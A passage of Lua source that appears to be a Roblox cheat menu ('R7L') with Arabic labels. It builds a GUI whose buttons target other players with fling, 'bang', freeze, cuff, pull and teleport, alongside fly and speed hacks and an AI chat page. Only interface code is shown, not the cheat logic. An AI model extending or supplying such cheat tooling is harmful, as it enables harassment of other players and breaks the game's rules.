    local cap = isTouchDevice and 0.65 or 1
    local scale = math.min(cap * (_T18UserScale or 1), rawFit)

    FrameScale.Scale = math.clamp(scale, 0.3, 2)

    if isTouchDevice then
        if ToggleBtn then
            ToggleBtn.Size = UDim2.new(0, 46, 0, 46)
            ToggleBtn.Position = UDim2.new(0, 16, 0.5, -50)
        end
        if ChatBubbleBtn then
            ChatBubbleBtn.Size = UDim2.new(0, 46, 0, 46)
            ChatBubbleBtn.Position = UDim2.new(0, 16, 0.5, 4)
        end
        if FlyTouchFrame then
            FlyTouchFrame.Size = UDim2.new(0, 170, 0, 140)
            FlyTouchFrame.Position = UDim2.new(1, -10, 1, -10)
        end
    else
        if ToggleBtn then
            ToggleBtn.Size = UDim2.new(0, 54, 0, 54)
            ToggleBtn.Position = UDim2.new(0, 16, 0.5, -58)
        end
        if ChatBubbleBtn then
            ChatBubbleBtn.Size = UDim2.new(0, 54, 0, 54)
            ChatBubbleBtn.Position = UDim2.new(0, 16, 0.5, 4)
        end
        if FlyTouchFrame then
            FlyTouchFrame.Size = UDim2.new(0, 184, 0, 150)
            FlyTouchFrame.Position = UDim2.new(1, -14, 1, -14)
        end
    end
end

local function bindViewportListener()
    if viewportConnection then
        viewportConnection:Disconnect()
        viewportConnection = nil
    end

    local camera = workspace.CurrentCamera
    if camera then
        viewportConnection = camera:GetPropertyChangedSignal("ViewportSize"):Connect(updateResponsiveLayout)
    end

    updateResponsiveLayout()
end

UiFx.makeGradient(Frame, {
    ColorSequenceKeypoint.new(0, Color3.fromRGB(12, 15, 35)),
    ColorSequenceKeypoint.new(0.55, Color3.fromRGB(9, 12, 28)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(2, 2, 2)),
}, 35)

local Header = Instance.new("Frame")
Header.Name = "Header"
Header.Size = UDim2.new(1, 0, 0, 76)
Header.BackgroundColor3 = Theme.Header
Header.BorderSizePixel = 0
Header.Parent = Frame
makeCorner(Header, 22)
UiFx.makeGradient(Header, {
    ColorSequenceKeypoint.new(0, Color3.fromRGB(6, 6, 6)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(8, 10, 24)),
}, 15)

do
    local HeaderBottomMask = Instance.new("Frame")
    HeaderBottomMask.Size = UDim2.new(1, 0, 0, 24)
    HeaderBottomMask.Position = UDim2.new(0, 0, 1, -24)
    HeaderBottomMask.BackgroundColor3 = Theme.Header
    HeaderBottomMask.BorderSizePixel = 0
    HeaderBottomMask.Parent = Header

    local AccentLine = Instance.new("Frame")
    AccentLine.Size = UDim2.new(1, -32, 0, 3)
    AccentLine.Position = UDim2.new(0, 16, 1, -3)
    AccentLine.BackgroundColor3 = Theme.Accent
    AccentLine.BorderSizePixel = 0
    AccentLine.Parent = Header
    makeCorner(AccentLine, 6)
    AccentLine.Visible = false
end

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(0.55, 0, 0, 28)
Title.Position = UDim2.new(0, 18, 0, 12)
Title.BackgroundTransparency = 1
Title.Text = "R7L"
Title.TextColor3 = Theme.Text
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Font = Enum.Font.GothamBlack
Title.TextSize = 24
Title.Parent = Header

do
    local Subtitle = Instance.new("TextLabel")
    Subtitle.Size = UDim2.new(0.58, 0, 0, 18)
    Subtitle.Position = UDim2.new(0, 18, 0, 42)
    Subtitle.BackgroundTransparency = 1
    Subtitle.Text = "شاركونا اقتراحاتكم على الدسكورد"
    Subtitle.TextColor3 = Theme.Muted
    Subtitle.TextXAlignment = Enum.TextXAlignment.Left
    Subtitle.Font = Enum.Font.Gotham
    Subtitle.TextSize = 15
    Subtitle.Parent = Header

    local TopBadge = Instance.new("Frame")
    TopBadge.Size = UDim2.new(0, 195, 0, 34)
    TopBadge.Position = UDim2.new(1, -211, 0, 20)
    TopBadge.BackgroundColor3 = Theme.PanelSoft
    TopBadge.BackgroundTransparency = 0.16
    TopBadge.BorderSizePixel = 0
    TopBadge.Parent = Header
    makeCorner(TopBadge, 12)
    makeStroke(TopBadge, Theme.Border, 1, 0.35)
    UiFx.makeStarField(TopBadge, 6)

    local TopBadgeDot = Instance.new("Frame")
    TopBadgeDot.Size = UDim2.new(0, 10, 0, 10)
    TopBadgeDot.Position = UDim2.new(0, 12, 0.5, -5)
    TopBadgeDot.BackgroundColor3 = Theme.PanelSoft
    TopBadgeDot.BackgroundTransparency = 0.08
    TopBadgeDot.BorderSizePixel = 0
    TopBadgeDot.Parent = TopBadge
    makeCorner(TopBadgeDot, 99)

    local TopBadgeText = Instance.new("TextLabel")
    TopBadgeText.Size = UDim2.new(1, -34, 1, 0)
    TopBadgeText.Position = UDim2.new(0, 28, 0, 0)
    TopBadgeText.BackgroundTransparency = 1
    TopBadgeText.Text = "عندك مشكلة؟ تواصل دسكورد"
    TopBadgeText.TextColor3 = Theme.Text
    TopBadgeText.TextXAlignment = Enum.TextXAlignment.Left
    TopBadgeText.Font = Enum.Font.GothamMedium
    TopBadgeText.TextScaled = true
    TopBadgeText.Parent = TopBadge

    local ProfileCard = Instance.new("Frame")
    ProfileCard.Size = UDim2.new(1, -32, 0, 80)
    ProfileCard.Position = UDim2.new(0, 16, 0, 82)
    ProfileCard.BackgroundColor3 = Theme.Card
    ProfileCard.BackgroundTransparency = 0.16
    ProfileCard.BorderSizePixel = 0
    ProfileCard.Parent = Frame
    makeCorner(ProfileCard, 18)
    makeStroke(ProfileCard, Theme.Border, 1, 0.28)
    UiFx.makeStarField(ProfileCard, 12)

    local ProfileGlow = Instance.new("Frame")
    ProfileGlow.Size = UDim2.new(0, 72, 0, 72)
    ProfileGlow.Position = UDim2.new(0, 10, 0.5, -36)
    ProfileGlow.BackgroundColor3 = Theme.AccentSoft
    ProfileGlow.BackgroundTransparency = 0.22
    ProfileGlow.BorderSizePixel = 0
    ProfileGlow.Parent = ProfileCard
    makeCorner(ProfileGlow, 18)

    local AvatarLetter = Instance.new("TextLabel")
    AvatarLetter.Size = UDim2.new(1, 0, 1, 0)
    AvatarLetter.BackgroundTransparency = 1
    AvatarLetter.Text = string.upper(string.sub(LocalPlayer.DisplayName, 1, 1))
    AvatarLetter.TextColor3 = Theme.Text
    AvatarLetter.Font = Enum.Font.GothamBlack
    AvatarLetter.TextSize = 30
    AvatarLetter.Parent = ProfileGlow

    local WelcomeLabel = Instance.new("TextLabel")
    WelcomeLabel.Size = UDim2.new(1, -110, 0, 28)
    WelcomeLabel.Position = UDim2.new(0, 98, 0, 14)
    WelcomeLabel.BackgroundTransparency = 1
    WelcomeLabel.Text = "اهلًا " .. LocalPlayer.DisplayName
    WelcomeLabel.TextColor3 = Theme.Text
    WelcomeLabel.TextXAlignment = Enum.TextXAlignment.Right
    WelcomeLabel.Font = Enum.Font.GothamBold
    WelcomeLabel.TextSize = 24
    WelcomeLabel.Parent = ProfileCard

    local PlanLabel = Instance.new("TextLabel")
    PlanLabel.Size = UDim2.new(1, -110, 0, 18)
    PlanLabel.Position = UDim2.new(0, 98, 0, 46)
    PlanLabel.BackgroundTransparency = 1
    PlanLabel.Text = "شاركونا اقتراحاتكم على الدسكورد | اضغط الزر الصغير لاخفاء النافذة"
    PlanLabel.TextColor3 = Theme.Muted
    PlanLabel.TextXAlignment = Enum.TextXAlignment.Right
    PlanLabel.Font = Enum.Font.Gotham
    PlanLabel.TextSize = 15
    PlanLabel.Parent = ProfileCard
end

local ContentPanel = Instance.new("Frame")
ContentPanel.Size = UDim2.new(1, -32, 0, 310)
ContentPanel.Position = UDim2.new(0, 16, 0, 168)
ContentPanel.BackgroundColor3 = Theme.Bg
ContentPanel.BackgroundTransparency = 0.24
ContentPanel.BorderSizePixel = 0
ContentPanel.Parent = Frame
makeCorner(ContentPanel, 18)
makeStroke(ContentPanel, Theme.Border, 1, 0.35)
UiFx.makeGradient(ContentPanel, {
    ColorSequenceKeypoint.new(0, Color3.fromRGB(8, 10, 24)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 6, 6)),
}, 90)
UiFx.makeStarField(ContentPanel, 14)

local PanelPadding = Instance.new("UIPadding")
PanelPadding.PaddingTop = UDim.new(0, 16)
PanelPadding.PaddingLeft = UDim.new(0, 16)
PanelPadding.PaddingRight = UDim.new(0, 16)
PanelPadding.Parent = ContentPanel

local SectionLabel = Instance.new("TextLabel")
SectionLabel.Size = UDim2.new(1, 0, 0, 18)
SectionLabel.BackgroundTransparency = 1
SectionLabel.Text = "التحكم الرئيسي"
SectionLabel.TextColor3 = Theme.Muted
SectionLabel.TextXAlignment = Enum.TextXAlignment.Right
SectionLabel.Font = Enum.Font.GothamMedium
SectionLabel.TextSize = 13
SectionLabel.Parent = ContentPanel

local function applyClickToClear(box)
    local _ccSaved = ""
    box.Focused:Connect(function()
        if box.Text ~= "" then
            _ccSaved = box.Text
            box.Text = ""
        end
    end)
    box.FocusLost:Connect(function()
        if box.Text == "" and _ccSaved ~= "" then
            box.Text = _ccSaved
            _ccSaved = ""
        end
    end)
end

local Input = Instance.new("TextBox")
Input.Size = UDim2.new(1, 0, 0, 42)
Input.Position = UDim2.new(0, 0, 0, 26)
Input.BackgroundColor3 = Theme.Input
Input.BackgroundTransparency = 0.22
Input.PlaceholderText = "اكتب اسم اللاعب هنا"
Input.Text = ""
Input.TextColor3 = Theme.Text
Input.PlaceholderColor3 = Theme.Muted
Input.Font = Enum.Font.Gotham
Input.TextSize = 18
Input.ClearTextOnFocus = false
Input.Parent = ContentPanel
makeCorner(Input, 12)
makeStroke(Input, Theme.Border, 1, 0.2)
applyClickToClear(Input)

local _refreshTargetLog

Input.FocusLost:Connect(function(enterPressed)
    if not enterPressed then return end
    local typed = Input.Text
    if not typed or #typed < 1 then return end

    local matched = nil
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Name:lower() == typed:lower() then
            matched = player
            break
        end
    end
    if not matched then
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Name:lower():find(typed:lower(), 1, true) then
                matched = player
                break
            end
        end
    end

    if not matched then return end

    if TargetLogPanel and TargetLogPanel.Visible then

        _t18LogTarget(matched.Name)
        Input.Text = ""
        pcall(function() _refreshTargetLog() end)
    else

        Input.Text = matched.Name
    end
end)

local function makeButton(name, text, size, position, baseColor, accentColor)
    local button = Instance.new("TextButton")
    local resolvedBase = baseColor or Theme.ButtonDefault
    local resolvedAccent = accentColor or Theme.ButtonDefaultAlt
    button.Name = name
    button.Size = size
    button.Position = position
    button.BackgroundColor3 = resolvedBase
    button.BackgroundTransparency = 0.08
    button.AutoButtonColor = false
    button.Text = text
    button.TextColor3 = Color3.fromRGB(255, 255, 255)
    button.TextStrokeTransparency = 0.55
    button.TextStrokeColor3 = Color3.fromRGB(200, 200, 200)
    button.Font = Enum.Font.GothamBold
    button.TextSize = 19
    button.Parent = ContentPanel
    makeCorner(button, 12)
    makeStroke(button, Theme.Border, 1, 0.05)
    UiFx.makeGradient(button, {
        ColorSequenceKeypoint.new(0, resolvedBase),
        ColorSequenceKeypoint.new(1, resolvedAccent),
    }, 90)

    local highlight = Instance.new("Frame")
    highlight.Name = "Highlight"
    highlight.Size = UDim2.new(1, -2, 0, 12)
    highlight.Position = UDim2.new(0, 1, 0, 1)
    highlight.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    highlight.BackgroundTransparency = 0.9
    highlight.BorderSizePixel = 0
    highlight.ZIndex = 1
    highlight.Parent = button
    makeCorner(highlight, 11)

    UiFx.attachButtonTextOverlay(
        button,
        19,
        Enum.Font.GothamBold,
        Color3.fromRGB(255, 255, 255),
        Color3.fromRGB(200, 200, 200),
        1
    )

    return button
end
local function makeInput(name, placeholder, defaultText, position)
    local box = Instance.new("TextBox")
    box.Name = name
    box.Size = UDim2.new(0, 178, 0, 40)
    box.Position = position
    box.BackgroundColor3 = Theme.Input
    box.BackgroundTransparency = 0.2
    box.TextColor3 = Theme.Text
    box.PlaceholderColor3 = Theme.Muted
    box.PlaceholderText = placeholder
    box.Text = defaultText or ""
    box.Font = Enum.Font.Gotham
    box.TextSize = 17
    box.ClearTextOnFocus = false
    box.Parent = ContentPanel
    makeCorner(box, 12)
    makeStroke(box, Theme.Border, 1, 0.2)
    applyClickToClear(box)
    return box
end

BangBtn = makeButton("BangBtn", "بانق", UDim2.new(0, 168, 0, 38), UDim2.new(0, 4, 0, 82), Theme.ButtonBlue, Theme.Accent)
ResetBtn = makeButton("ResetBtn", "ريسيت", UDim2.new(0, 168, 0, 38), UDim2.new(0, 190, 0, 82), Theme.ButtonBlue, Theme.Accent)
FlingBtn = makeButton("FlingBtn", "حماية بانق", UDim2.new(1, -8, 0, 38), UDim2.new(0, 4, 0, 130), Theme.ButtonBlue, Theme.Accent)
TargetFlingBtn = makeButton("TargetFlingBtn", "فلنق", UDim2.new(0, 168, 0, 38), UDim2.new(0, 190, 0, 130), Theme.ButtonBlue, Theme.Accent)
FlyBtn = makeButton("FlyBtn", "طيران", UDim2.new(0, 168, 0, 38), UDim2.new(0, 4, 0, 178), Theme.ButtonBlue, Theme.Accent)
SpeedInput = makeInput("SpeedInput", "سرعة الطيران", "50", UDim2.new(0, 190, 0, 178))
WalkSpeedBtn = makeButton("WalkSpeedBtn", "سرعة اللاعب", UDim2.new(0, 168, 0, 38), UDim2.new(0, 4, 0, 226), Theme.ButtonBlue, Theme.Accent)
WalkSpeedInput = makeInput("WalkSpeedInput", "سرعة المشي", "16", UDim2.new(0, 190, 0, 226))
ZombieWalkBtn = makeButton("ZombieWalkBtn", "مشية زومبي", UDim2.new(1, -8, 0, 38), UDim2.new(0, 4, 0, 274), Theme.ButtonBlue, Theme.Accent)
_G._HLBtn = makeButton("HeadlessBtn", "هيدلس", UDim2.new(1, -8, 0, 38), UDim2.new(0, 4, 0, 274), Theme.ButtonBlue, Theme.Accent)

SpeedLabel = Instance.new("TextLabel")
SpeedLabel.Size = UDim2.new(0, 178, 0, 40)
SpeedLabel.Position = UDim2.new(1, -176, 0, 176)
SpeedLabel.BackgroundTransparency = 1
SpeedLabel.Text = "W A S D | Space | Shift"
SpeedLabel.TextColor3 = Color3.fromRGB(148, 163, 184)
SpeedLabel.TextXAlignment = Enum.TextXAlignment.Right
SpeedLabel.Font = Enum.Font.Gotham
SpeedLabel.TextSize = 15
SpeedLabel.Parent = ContentPanel

TeleportBtn = makeButton("TeleportBtn", "تنقل", UDim2.new(0, 168, 0, 38), UDim2.new(0, 4, 0, 274), Theme.ButtonBlue, Theme.Accent)
SpectateBtn = makeButton("SpectateBtn", "مشاهدة", UDim2.new(0, 168, 0, 38), UDim2.new(0, 190, 0, 274), Theme.ButtonBlue, Theme.Accent)
HeadBangBtn = makeButton("HeadBangBtn", "هيد بانق", UDim2.new(0, 168, 0, 38), UDim2.new(0, 4, 0, 274), Theme.ButtonBlue, Theme.Accent)
SavePlaceBtn  = makeButton("SavePlaceBtn",  "حفظ مكاني", UDim2.new(0, 168, 0, 38), UDim2.new(1, -172, 0, 274), Theme.ButtonBlue, Theme.Accent)
HangAutoBtn   = makeButton("HangAutoBtn",   "تعليق",     UDim2.new(0, 168, 0, 38), UDim2.new(0, 4,    0, 274), Theme.ButtonBlue, Theme.Accent)
_Hang.freezeBtn     = makeButton("FreezeOnlyBtn","تجميد",     UDim2.new(0, 168, 0, 38), UDim2.new(0, 4,    0, 274), Theme.ButtonBlue, Theme.Accent)
_Hang.cuffBtn       = makeButton("CuffOnlyBtn",  "كلبش",      UDim2.new(0, 168, 0, 38), UDim2.new(0, 4,    0, 274), Theme.ButtonBlue, Theme.Accent)
_Hang.pullBtn        = makeButton("PullBtn",       "سحب",       UDim2.new(0, 168, 0, 38), UDim2.new(0, 4,    0, 274), Theme.ButtonBlue, Theme.Accent)

PanelPadding:Destroy()
SectionLabel:Destroy()
ContentPanel.ClipsDescendants = true

local SidebarHost = Instance.new("Frame")
SidebarHost.Name = "Sidebar"
SidebarHost.Size = UDim2.new(0, 132, 1, -10)
SidebarHost.Position = UDim2.new(0, 10, 0, 10)
SidebarHost.BackgroundColor3 = Theme.Header
SidebarHost.BackgroundTransparency = 0.22
SidebarHost.BorderSizePixel = 0
SidebarHost.ClipsDescendants = true
SidebarHost.Parent = ContentPanel
makeCorner(SidebarHost, 14)
makeStroke(SidebarHost, Theme.Border, 1, 0.2)
UiFx.makeGradient(SidebarHost, {
    ColorSequenceKeypoint.new(0, Color3.fromRGB(16, 20, 42)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(4, 4, 4)),
}, 90)
UiFx.makeStarField(SidebarHost, 10)

local Sidebar
do
    local _sideScroll = Instance.new("ScrollingFrame")
    _sideScroll.Size = UDim2.new(1, 0, 1, 0)
    _sideScroll.CanvasSize = UDim2.new(0, 0, 0, isOwnerUser and 480 or 400)
    _sideScroll.ScrollBarThickness = 3
    _sideScroll.ScrollBarImageColor3 = Theme.Border
    _sideScroll.ScrollingDirection = Enum.ScrollingDirection.Y
    _sideScroll.BackgroundTransparency = 1
    _sideScroll.BorderSizePixel = 0
    _sideScroll.Parent = SidebarHost
    Sidebar = _sideScroll
end

local SidebarTitle = Instance.new("TextLabel")
SidebarTitle.Size = UDim2.new(1, -16, 0, 22)
SidebarTitle.Position = UDim2.new(0, 8, 0, 12)
SidebarTitle.BackgroundTransparency = 1
SidebarTitle.Text = "القوائم"
SidebarTitle.TextColor3 = Theme.Text
SidebarTitle.TextXAlignment = Enum.TextXAlignment.Right
SidebarTitle.Font = Enum.Font.GothamBold
SidebarTitle.TextSize = 17
SidebarTitle.Parent = Sidebar

local SidebarHint = Instance.new("TextLabel")
SidebarHint.Size = UDim2.new(1, -16, 0, 28)
SidebarHint.Position = UDim2.new(0, 8, 0, 34)
SidebarHint.BackgroundTransparency = 1
SidebarHint.Text = "اختر القسم"
SidebarHint.TextColor3 = Theme.Muted
SidebarHint.TextXAlignment = Enum.TextXAlignment.Right
SidebarHint.Font = Enum.Font.Gotham
SidebarHint.TextSize = 14
SidebarHint.Parent = Sidebar

local PagesHost = Instance.new("Frame")
PagesHost.Name = "PagesHost"
PagesHost.Size = UDim2.new(1, -162, 1, -20)
PagesHost.Position = UDim2.new(0, 152, 0, 10)
PagesHost.BackgroundColor3 = Theme.Card
PagesHost.BackgroundTransparency = 0.24
PagesHost.BorderSizePixel = 0
PagesHost.Parent = ContentPanel
makeCorner(PagesHost, 14)
makeStroke(PagesHost, Theme.Border, 1, 0.2)
UiFx.makeGradient(PagesHost, {
    ColorSequenceKeypoint.new(0, Color3.fromRGB(16, 22, 44)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 14, 28)),
}, 115)
UiFx.makeStarField(PagesHost, 16)

local function makePage(name)
    local page = Instance.new("Frame")
    page.Name = name
    page.Size = UDim2.new(1, 0, 1, 0)
    page.BackgroundTransparency = 1
    page.Visible = false
    page.Parent = PagesHost
    return page
end

local function makePageTitle(parent, titleText, subtitleText)
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Size = UDim2.new(1, -20, 0, 22)
    titleLabel.Position = UDim2.new(0, 10, 0, 10)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = titleText
    titleLabel.TextColor3 = Theme.Text
    titleLabel.TextXAlignment = Enum.TextXAlignment.Right
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextSize = 19
    titleLabel.Parent = parent

    local subtitleLabel = Instance.new("TextLabel")
    subtitleLabel.Size = UDim2.new(1, -20, 0, 18)
    subtitleLabel.Position = UDim2.new(0, 10, 0, 34)
    subtitleLabel.BackgroundTransparency = 1
    subtitleLabel.Text = subtitleText
    subtitleLabel.TextColor3 = Theme.Muted
    subtitleLabel.TextXAlignment = Enum.TextXAlignment.Right
    subtitleLabel.Font = Enum.Font.Gotham
    subtitleLabel.TextSize = 14
    subtitleLabel.Parent = parent
end

local MainPage = makePage("MainPage")
local PlayerPage = makePage("PlayerPage")
local TargetPage = makePage("TargetPage")
local ImportantPage = makePage("ImportantPage")
local AIPage = makePage("R7LAIPage")
local OwnerPage = nil
local OwnerTargetInput = nil
local OwnerTargetHint = nil
local OwnerKickBtn = nil
local OwnerFreezeBtn = nil
local OwnerRespawnLoopBtn = nil
local OwnerSummonBtn = nil

local SubscribersPage = nil
local SubTargetInput = nil
local SubTargetHint = nil

local OthersPage = makePage("OthersPage")
makePageTitle(OthersPage, "اخرى", "ميزات اضافية")

local MudadatPage = makePage("MudadatPage")
makePageTitle(MudadatPage, "مضادات", "الحماية والمضادات")

do
    local sf = Instance.new("ScrollingFrame")
    sf.Name = "KlabshatPage"
    sf.Size = UDim2.new(1, 0, 1, 0)
    sf.BackgroundTransparency = 1
    sf.Visible = false
    sf.CanvasSize = UDim2.new(0, 0, 0, 350)
    sf.ScrollBarThickness = 4
    sf.ScrollBarImageColor3 = Theme.Accent
    sf.ScrollingDirection = Enum.ScrollingDirection.Y
    sf.BorderSizePixel = 0
    sf.Parent = PagesHost
    KlabshatPage = sf
end
makePageTitle(KlabshatPage, "كلبشات", "اوامر الكلبشة")

makePageTitle(MainPage, "القائمة الرئيسية", "ملاحظة مهمة : يا اخوان حماية البانق ما تشتغل الا على سكربت V.R.7")
makePageTitle(PlayerPage, "اللاعب", "اوامر الحركة والسرعة")
makePageTitle(TargetPage, "استهداف", "اوامر التعامل مع اللاعبين")
makePageTitle(ImportantPage, "اخبار", "آخر التحديثات والازرار الجديده")
makePageTitle(AIPage, "R7L AI", "R7L AI تقدر تسأله اي سؤال بخاطرك وان شاء الله ما يقصر معك")

do
local function _R7LABuildChatPage()
local _R7LAIHistory = {}
local _R7LAIBusy = false

-- ══════════════════════════════════════════════════════════
--  شريط الحالة (Status Bar)
-- ══════════════════════════════════════════════════════════
local AIStatusBar = Instance.new("Frame")
AIStatusBar.Name = "R7LAIStatusBar"
AIStatusBar.Size = UDim2.new(1, -20, 0, 32)
AIStatusBar.Position = UDim2.new(0, 10, 0, 56)
AIStatusBar.BackgroundColor3 = Theme.PanelSoft
AIStatusBar.BackgroundTransparency = 0.1
AIStatusBar.BorderSizePixel = 0
AIStatusBar.Parent = AIPage
makeCorner(AIStatusBar, 10)
makeStroke(AIStatusBar, Theme.Border, 1, 0.25)

local AIStatusDot = Instance.new("Frame")
AIStatusDot.Name = "StatusDot"
AIStatusDot.Size = UDim2.new(0, 7, 0, 7)
AIStatusDot.AnchorPoint = Vector2.new(0.5, 0.5)
AIStatusDot.Position = UDim2.new(1, -16, 0.5, 0)
AIStatusDot.BackgroundColor3 = Theme.Muted
AIStatusDot.BorderSizePixel = 0
AIStatusDot.Parent = AIStatusBar
makeCorner(AIStatusDot, 4)

local AIStatusLabel = Instance.new("TextLabel")
AIStatusLabel.Name = "R7LAIStatus"
AIStatusLabel.Size = UDim2.new(1, -40, 1, 0)
AIStatusLabel.Position = UDim2.new(0, 12, 0, 0)
AIStatusLabel.BackgroundTransparency = 1
AIStatusLabel.Text = "جاهز للمحادثة"
AIStatusLabel.TextColor3 = Theme.Muted
AIStatusLabel.TextXAlignment = Enum.TextXAlignment.Right
AIStatusLabel.Font = Enum.Font.Gotham
AIStatusLabel.TextSize = 12
AIStatusLabel.TextTruncate = Enum.TextTruncate.AtEnd
AIStatusLabel.Parent = AIStatusBar

-- نبضة خفيفة مستمرة لنقطة الحالة (تدل إن النظام حي)
local _aiDotPulsing = false
task.spawn(function()
    while true do
        if _aiDotPulsing then
            game:GetService("TweenService"):Create(
                AIStatusDot, TweenInfo.new(0.55, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
                { BackgroundTransparency = 0.55 }
            ):Play()
        else
            AIStatusDot.BackgroundTransparency = 0
        end
        task.wait(1.1)
    end
end)

-- ══════════════════════════════════════════════════════════
--  منطقة المحادثة
-- ══════════════════════════════════════════════════════════
local AIChatScroll = Instance.new("ScrollingFrame")
AIChatScroll.Name = "R7LAIConversation"
AIChatScroll.Size = UDim2.new(1, -20, 1, -158)
AIChatScroll.Position = UDim2.new(0, 10, 0, 96)
AIChatScroll.BackgroundColor3 = Theme.Panel
AIChatScroll.BackgroundTransparency = 0.12
AIChatScroll.BorderSizePixel = 0
AIChatScroll.ScrollBarThickness = isTouchDevice and 3 or 4
AIChatScroll.ScrollBarImageColor3 = Theme.Border
AIChatScroll.ScrollingDirection = Enum.ScrollingDirection.Y
AIChatScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
AIChatScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
AIChatScroll.Parent = AIPage
makeCorner(AIChatScroll, 12)
makeStroke(AIChatScroll, Theme.Border, 1, 0.25)

local AIChatPadding = Instance.new("UIPadding")
AIChatPadding.PaddingTop = UDim.new(0, 10)
AIChatPadding.PaddingBottom = UDim.new(0, 10)
AIChatPadding.PaddingLeft = UDim.new(0, 8)
AIChatPadding.PaddingRight = UDim.new(0, 8)
AIChatPadding.Parent = AIChatScroll

local AIChatLayout = Instance.new("UIListLayout")
AIChatLayout.Padding = UDim.new(0, 10)
AIChatLayout.SortOrder = Enum.SortOrder.LayoutOrder
AIChatLayout.Parent = AIChatScroll

local function _R7LAISetStatus(text, isError, thinking)
    AIStatusLabel.Text = tostring(text)
    AIStatusLabel.TextColor3 = isError and Color3.fromRGB(235, 150, 150) or Theme.Muted
    AIStatusDot.BackgroundColor3 = isError and Color3.fromRGB(235, 150, 150) or Theme.Text
    _aiDotPulsing = thinking and true or false
end

local function _R7LAITimestamp()
    local ok, result = pcall(function()
        return DateTime.now():FormatLocalTime("HH:mm", "en-us")
    end)
    return ok and result or ""
end

local function _R7LAIScrollToBottom()
    task.defer(function()
        if AIChatScroll.Parent then
            AIChatScroll.CanvasPosition = Vector2.new(0, math.max(0, AIChatLayout.AbsoluteContentSize.Y))
        end
    end)
end

-- فقاعة محادثة فخمة: أفاتار + اسم + نص + وقت + دخول متحرك
local function _R7LAIAddBubble(role, text)
    local isUser = role == "user"

    local wrapper = Instance.new("Frame")
    wrapper.Name = "MessageRow"
    wrapper.BackgroundTransparency = 1
    wrapper.Size = UDim2.new(1, -2, 0, 0)
    wrapper.AutomaticSize = Enum.AutomaticSize.Y
    wrapper.LayoutOrder = #AIChatScroll:GetChildren()
    wrapper.Parent = AIChatScroll

    -- الأفاتار (دائرة صغيرة بحرف)
    local avatar = Instance.new("Frame")
    avatar.Name = "Avatar"
    avatar.Size = UDim2.new(0, 24, 0, 24)
    avatar.Position = isUser and UDim2.new(1, -24, 0, 0) or UDim2.new(0, 0, 0, 0)
    avatar.BackgroundColor3 = isUser and Theme.Active or Theme.ButtonDefault
    avatar.BorderSizePixel = 0
    avatar.ZIndex = 2
    avatar.Parent = wrapper
    makeCorner(avatar, 12)
    makeStroke(avatar, Theme.Border, 1, 0.2)

    local avatarLabel = Instance.new("TextLabel")
    avatarLabel.Size = UDim2.fromScale(1, 1)
    avatarLabel.BackgroundTransparency = 1
    avatarLabel.Text = isUser and (tostring(LocalPlayer.Name):sub(1, 1):upper()) or "A"
    avatarLabel.TextColor3 = Theme.Text
    avatarLabel.Font = Enum.Font.GothamBold
    avatarLabel.TextSize = 12
    avatarLabel.ZIndex = 3
    avatarLabel.Parent = avatar

    -- الفقاعة
    local bubble = Instance.new("Frame")
    bubble.Name = isUser and "UserBubble" or "AIBubble"
    bubble.Position = isUser and UDim2.new(0, 0, 0, 0) or UDim2.new(0, 30, 0, 0)
    bubble.Size = UDim2.new(1, isUser and -30 or -30, 0, 0)
    bubble.AutomaticSize = Enum.AutomaticSize.Y
    bubble.BackgroundColor3 = isUser and Theme.Active or Theme.PanelSoft
    bubble.BackgroundTransparency = 1 -- يبدأ شفاف ثم يظهر بتأثير
    bubble.BorderSizePixel = 0
    bubble.ClipsDescendants = true
    bubble.ZIndex = 1
    bubble.Parent = wrapper
    makeCorner(bubble, 10)
    makeStroke(bubble, Theme.Border, 1, isUser and 0.3 or 0.15)

    -- شريط تمييز رفيع لفقاعة الذكاء الاصطناعي فقط
    if not isUser then
        local accentBar = Instance.new("Frame")
        accentBar.Size = UDim2.new(0, 2, 1, 0)
        accentBar.BackgroundColor3 = Theme.Accent
        accentBar.BackgroundTransparency = 0.25
        accentBar.BorderSizePixel = 0
        accentBar.ZIndex = 2
        accentBar.Parent = bubble
    end

    local bubblePadding = Instance.new("UIPadding")
    bubblePadding.PaddingTop = UDim.new(0, 7)
    bubblePadding.PaddingBottom = UDim.new(0, 8)
    bubblePadding.PaddingLeft = UDim.new(0, 10)
    bubblePadding.PaddingRight = UDim.new(0, 10)
    bubblePadding.Parent = bubble

    local headerRow = Instance.new("Frame")
    headerRow.Size = UDim2.new(1, 0, 0, 16)
    headerRow.BackgroundTransparency = 1
    headerRow.ZIndex = 2
    headerRow.Parent = bubble

    local roleLabel = Instance.new("TextLabel")
    roleLabel.Size = UDim2.new(0.7, 0, 1, 0)
    roleLabel.BackgroundTransparency = 1
    roleLabel.Text = isUser and T18T("أنت") or "R7L AI"
    roleLabel.TextColor3 = isUser and Theme.Text or Theme.Accent
    roleLabel.TextXAlignment = isUser and Enum.TextXAlignment.Right or Enum.TextXAlignment.Left
    roleLabel.Font = Enum.Font.GothamBold
    roleLabel.TextSize = 12
    roleLabel.ZIndex = 2
    roleLabel.Parent = headerRow

    local timeLabel = Instance.new("TextLabel")
    timeLabel.Size = UDim2.new(0.3, 0, 1, 0)
    timeLabel.BackgroundTransparency = 1
    timeLabel.Text = _R7LAITimestamp()
    timeLabel.TextColor3 = Theme.Muted
    timeLabel.TextXAlignment = isUser and Enum.TextXAlignment.Left or Enum.TextXAlignment.Right
    timeLabel.Font = Enum.Font.Code
    timeLabel.TextSize = 10
    timeLabel.ZIndex = 2
    timeLabel.Parent = headerRow

    local body = Instance.new("TextLabel")
    body.Name = "MessageText"
    body.Size = UDim2.new(1, 0, 0, 0)
    body.Position = UDim2.new(0, 0, 0, 19)
